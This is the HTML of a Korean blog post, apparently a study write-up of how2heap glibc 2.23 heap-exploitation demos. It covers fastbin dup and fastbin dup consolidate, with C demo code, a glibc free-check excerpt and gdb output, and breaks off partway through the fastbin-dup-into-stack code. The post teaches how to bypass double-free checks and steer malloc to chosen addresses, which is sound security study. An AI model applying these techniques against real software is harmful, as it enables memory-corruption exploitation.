@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang=ko>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="힙을 부시기 위해서 how2heap을 완벽 분석하려고 한다. fastbin dupfastbin dup을 설명하기 위한 코드는 다음과 같다. 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#inc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="glibc 2.23 how2heap">
+<meta property="og:url" content="http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/index.html">
+<meta property="og:site_name" content="p0her">
+<meta property="og:description" content="힙을 부시기 위해서 how2heap을 완벽 분석하려고 한다. fastbin dupfastbin dup을 설명하기 위한 코드는 다음과 같다. 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#inc">
+<meta property="og:locale" content="ko_KR">
+<meta property="article:published_time" content="2023-05-06T18:12:58.000Z">
+<meta property="article:modified_time" content="2023-05-06T19:50:49.763Z">
+<meta property="article:author" content="p0her">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/mikoto.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/mikoto.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/mikoto.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>glibc 2.23 how2heap</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/05/05/first-fit-next-fit-best-fit-worst-fit/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&text=glibc 2.23 how2heap"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&title=glibc 2.23 how2heap"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&is_video=false&description=glibc 2.23 how2heap"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=glibc 2.23 how2heap&body=Check out this article: http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&title=glibc 2.23 how2heap"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&title=glibc 2.23 how2heap"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&title=glibc 2.23 how2heap"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&title=glibc 2.23 how2heap"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&name=glibc 2.23 how2heap&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&t=glibc 2.23 how2heap"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup"><span class="toc-number">1.</span> <span class="toc-text">fastbin dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-consolidate"><span class="toc-number">2.</span> <span class="toc-text">fastbin dup consolidate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-into-stack"><span class="toc-number">3.</span> <span class="toc-text">fastbin dup into stack</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        glibc 2.23 how2heap
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">p0her</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-06T18:12:58.000Z" class="dt-published" itemprop="datePublished">2023-05-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/how2heap/">how2heap</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>힙을 부시기 위해서 how2heap을 완벽 분석하려고 한다.</p>
+<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin dup"></a>fastbin dup</h2><p>fastbin dup을 설명하기 위한 코드는 다음과 같다.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>코드를 설명하기 전에, fastbin dup의 원리를 알아보자. glibc 2.23 버전 malloc.c의 <code>_int_free</code> 함수중 일 부분을 보자.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">	   (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">	   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">	   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">	   deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">	<span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">	  old_idx = <span class="built_in">fastbin_index</span>(<span class="built_in">chunksize</span>(old));</span><br><span class="line">	p-&gt;fd = old2 = old;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = <span class="built_in">catomic_compare_and_exchange_val_rel</span> (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>해당 부분은 fastbin size의 chunk를 free 할 때 수행되는 코드 중 일부분이다. <code>old</code> 포인터는 현재 chunk를 free 하기 전 free 했던 포인터를 가지고 있다. <code>p</code> 는 현재 free할 예정인 chunk의 포인터를 가지고 있는데, 이 때 <code>old</code> 포인터와 <code>p</code> 포인터가 같은지 확인한다. 이렇게하면 연속적으로 같은 청크를 free 하는 공격을 방지할 수 있다.<br>하지만 이걸 bypass 하는 방법은 간단한데, <code>old</code>와 <code>p</code>포인터만 다르게 해주면 되니까, 청크를 2개 할당한다고 가정하면, 첫 번째 청크를 free하고 바로 free를 다시 하는게 아니라 두 번째 청크를 free 하고 첫 번쨰 청크를 free 해주면 <code>old != p</code> 가 되어 검증 루틴을 bypass 할 수 있다.<br>각 malloc과 free에 브레이크 포인트를 걸고 bin들을 살펴보자.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x602020 --&gt; 0x602000 --&gt; 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x602060 (size : 0x20fa0)</span><br><span class="line">       last_remainder: 0x0 (size : 0x0)</span><br><span class="line">            unsortbin: 0x0</span><br></pre></td></tr></table></figure>
+<p>3개의 청크를 할당한 후 <code>a</code>와 <code>b</code>를 각 각 free 한 뒤 모습이다. fastbin은 LIFO 구조로 청크들이 들어가므로 가장 마지막에 free한게 가장 첫 번째에 있는걸 볼 수 있다. 여기서 이제 다시 <code>a</code>를 free해보자.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x602000 --&gt; 0x602020 --&gt; 0x602000 (overlap chunk with 0x602000(freed) )</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x602060 (size : 0x20fa0)</span><br><span class="line">       last_remainder: 0x0 (size : 0x0)</span><br><span class="line">            unsortbin: 0x0</span><br></pre></td></tr></table></figure>
+<p>보면 같은 bin에 같은 주소의 청크가 들어간 걸 볼 수 있다. 그럼 이걸 어디에 써먹냐를 이제 알아야하는데, 이 기법의 주요 장점은 각 다른 포인터에 malloc을 할당할 때, 같은 청크 주소를 각기 다른 포인터가 가질 수 있다. 이러면 use-after-free 로도 이어질 수 있고 응용할 수 있는 방법은 많다. 가장 흔히 쓰이는 테크닉은, 첫 번째 malloc을 할 때 fd를 우리가 원하는 주소로 덮으면, 첫 번째 청크는 malloc해도 여전히 그 주소를 가지고 있고,(초기화하지 않는 이상) 그리고 두 번째 청크를 malloc 하더라도 여전히 첫 번째 청크가 bin에 들어가있으므로 이 때 fd는 우리가 원하는 주소로 overwrite 했기 때문에 다음 malloc을 할당받을 때 원하는 주소에 할당 받을 수 있어서 여러 공격으로 이어질 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0xa6a010</span><br><span class="line">2nd malloc(8): 0xa6a030</span><br><span class="line">3rd malloc(8): 0xa6a050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0xa6a010 again, things will crash because 0xa6a010 is at the top of the free list.</span><br><span class="line">So, instead, we&#x27;ll free 0xa6a030.</span><br><span class="line">Now, we can free 0xa6a010 again, since it&#x27;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0xa6a010, 0xa6a030, 0xa6a010 ]. If we malloc 3 times, we&#x27;ll get 0xa6a010 twice!</span><br><span class="line">1st malloc(8): 0xa6a010</span><br><span class="line">2nd malloc(8): 0xa6a030</span><br><span class="line">3rd malloc(8): 0xa6a010</span><br></pre></td></tr></table></figure>
+<p>마지막 결과만 살펴보면, 1st malloc과 3rd malloc이 같은 주소를 가지고 있는걸 확인할 수 있다.</p>
+<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin dup consolidate"></a>fastbin dup consolidate</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This is a powerful technique that bypasses the double free check in tcachebin.&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up the tcache list to force the fastbin usage...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing p1 will add this chunk to the fastbin list...\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating a tcache-sized chunk (p3=%p)\n&quot;</span>, p3);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;will trigger the malloc_consolidate and merge\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the fastbin chunks into the top chunk, thus\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p1 and p3 are now pointing to the same chunk !\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(p1 == p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Triggering the double free vulnerability!\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(p4 == p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The double free added the chunk referenced by p1 \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;to the tcache thus the next similar-size malloc will\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;point to p3: p3=%p, p4=%p\n\n&quot;</span>,p3, p4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>double free 검증 루틴을 bypass 할 수 있는 또 다른 방법이다. 이 기법의 근거가 되는 <code>malloc_consolidate</code> 함수가 있다. fastbin에 chunk가 존재하는 상태에서 unsorted bin, large bin, small bin size의 chunk를 할당하게 되면, consolidate (병합) 이라는 과정을 거친다. 그러면 fastbin에 있던 chunk가 다른 bin으로 옮겨져 fastbin dup에서 설명했던 check를 bypass할 수 있다.<br>이 상태에서 다시 free 하면 double free 완료다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">This is a powerful technique that bypasses the double free check in tcachebin.</span><br><span class="line">Fill up the tcache list to force the fastbin usage...</span><br><span class="line">Allocate another chunk of the same size p1=0x13cd420</span><br><span class="line">Freeing p1 will add this chunk to the fastbin list...</span><br><span class="line"></span><br><span class="line">Allocating a tcache-sized chunk (p3=0x13cd420)</span><br><span class="line">will trigger the malloc_consolidate and merge</span><br><span class="line">the fastbin chunks into the top chunk, thus</span><br><span class="line">p1 and p3 are now pointing to the same chunk !</span><br><span class="line"></span><br><span class="line">Triggering the double free vulnerability!</span><br><span class="line"></span><br><span class="line">The double free added the chunk referenced by p1</span><br><span class="line">to the tcache thus the next similar-size malloc will</span><br><span class="line">point to p3: p3=0x13cd420, p4=0x13cd420</span><br></pre></td></tr></table></figure>
+<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin dup into stack"></a>fastbin dup into stack</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span 